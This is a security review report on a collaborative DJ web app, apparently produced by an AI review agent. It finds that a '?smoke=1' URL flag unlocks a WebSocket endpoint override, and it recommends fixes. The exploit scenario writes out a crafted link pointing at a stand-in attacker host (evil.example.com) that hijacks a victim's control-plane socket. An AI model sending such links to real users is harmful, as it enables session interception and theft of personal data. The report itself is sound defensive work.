# Security Review — Mix//Sync — July 3, 2026

Full-codebase pass (app + smoke/mock/netem/audit tooling), report-only per
Chad's request. Method: detection sub-agent over the security-relevant
surfaces → direct code verification of each candidate → confidence filter
(report ≥8/10 only). One finding clears the bar.

---

# Vuln 1: Auth-gate bypass → WS control-plane redirect (session MITM + PII): `src/collabmix-production.jsx:209,438`

- **Severity: HIGH**  · **Confidence: 9/10** · **Category:** authorization bypass → data exposure / signaling MITM
- **Status:** PRE-EXISTING (not introduced this weekend — the `?smoke=1` gate predates this session; surfaced now because the review was a full pass). Flagging because it's a real, single-click-exploitable issue and the next production push should carry the fix.

**Description.** The `?wsurl` WS-endpoint override is meant to be inert in production. Its guard is `TEST_HOOKS`, which any URL flag can flip:

```
209: const TEST_HOOKS = (import.meta.env && import.meta.env.DEV) || URL_FLAGS.get("smoke") === "1";
438: const SERVER_URL = (TEST_HOOKS && URL_FLAGS.get("wsurl")) || DEFAULT_SERVER_URL;
```

In a production build `import.meta.env.DEV` is a compile-time `false`, but the OR clause means `?smoke=1` — itself attacker-supplied in the URL — is enough to make `TEST_HOOKS` true. `SERVER_URL` is then taken verbatim from `?wsurl` (no allowlist, no loopback check) and flows into `new WebSocket(url)` in `useSync`. The code comment at `:432-434` ("a crafted link can NEVER redirect a real user's socket") is therefore incorrect: the gate is opened by exactly the input class it is meant to exclude.

**Exploit scenario.** Attacker sends the victim:
`https://collabmix.vercel.app/?smoke=1&wsurl=wss://evil.example.com`
Victim clicks → `TEST_HOOKS` true → the victim's entire WS control plane terminates at the attacker's server. `wss://` avoids mixed-content blocking, so a click is the only precondition. The attacker then:
1. Brokers all WebRTC signaling (`rtc_offer`/`rtc_answer`/`rtc_ice`) → can rewrite SDP/ICE to route the P2P audio through their own relay = **media MITM**, and harvests the victim's ICE candidates (local/public IP disclosure).
2. Captures PII sent over the socket: `djName`, room code, chat messages, mix name.
3. Feeds the client arbitrary `deck_update`/`deck_driver_change`/etc.
Impact is scoped to the victim who clicked (no other-user or server compromise, no persistence), which is why it's HIGH-single-victim rather than critical.

**Recommendation.** Do not let a URL flag open the override. Two options:
- Simplest: gate `?wsurl` on the build-time constant only — `const SERVER_URL = (import.meta.env.DEV && URL_FLAGS.get("wsurl")) || DEFAULT_SERVER_URL;`. But this breaks `TARGET=<deploy> npm run smoke:e2e` (the suite uses `?smoke=1` to honor `?wsurl` against a built target — see tools/smoke/lib/e2e.mjs `appUrl`).
- Preferred (keeps the smoke-against-a-deploy workflow): when the gate is opened by `?smoke=1` rather than DEV, additionally require the `?wsurl` host to be loopback (`localhost`/`127.0.0.1`). A crafted `wss://evil…` link is then rejected while the local mock still works. `?smoke=1` also installs the `window.__*` test hooks, but those need in-page JS to invoke and aren't reachable from a link, so the socket redirect is the exploitable primitive to close.

---

## Reviewed and cleared (no finding above the bar)

- **Local HTTP control endpoints** — `tools/netem/turn-jitter-proxy.mjs` `/shape` (127.0.0.1:3480) and `tools/smoke/lib/mock-ws-server.mjs` `/netem`+`/health` (with `ACAO:*`): reachable via CSRF-to-localhost, but the only actions are reconfiguring local jitter emulation and reading room/dj counts — no sensitive action, secret, code-exec, or persistence. Test-harness tools, absent from the production runtime.
- **`tools/audit/analyzer-audit.mjs:100`** `execFileSync("afconvert", [array])` — no shell, argument array, filenames from the local `~/Music` walk. No command injection, no traversal into a sink.
- **`new Function("self", WORKER_SRC)`** (audit + app worker instantiation) — `WORKER_SRC` is a static in-repo constant with no attacker data interpolated.
- **`mungeOpusHiFi` SDP munging / `?bpmretry`** — regex string-replace on the local description / an analysis toggle; no attacker data reaches a dangerous sink.
- **`src/conn-quality.js`, `[CONN-QUALITY]`/`[SEND-DIAG]` logs, `src/utils/sessionLog.js`** — pure numeric classification; logs carry no secrets/PII; the session-log export is a user-initiated same-origin download of the user's own data.
- **XSS** — no `dangerouslySetInnerHTML`/`innerHTML`/`document.write`/`eval` in `src/`; partner-controlled `djName`/`chat` render through React's escaped text path.

Net: 1 HIGH (pre-existing `?smoke=1` → `?wsurl` gate bypass). Recommend fixing before the next production push.
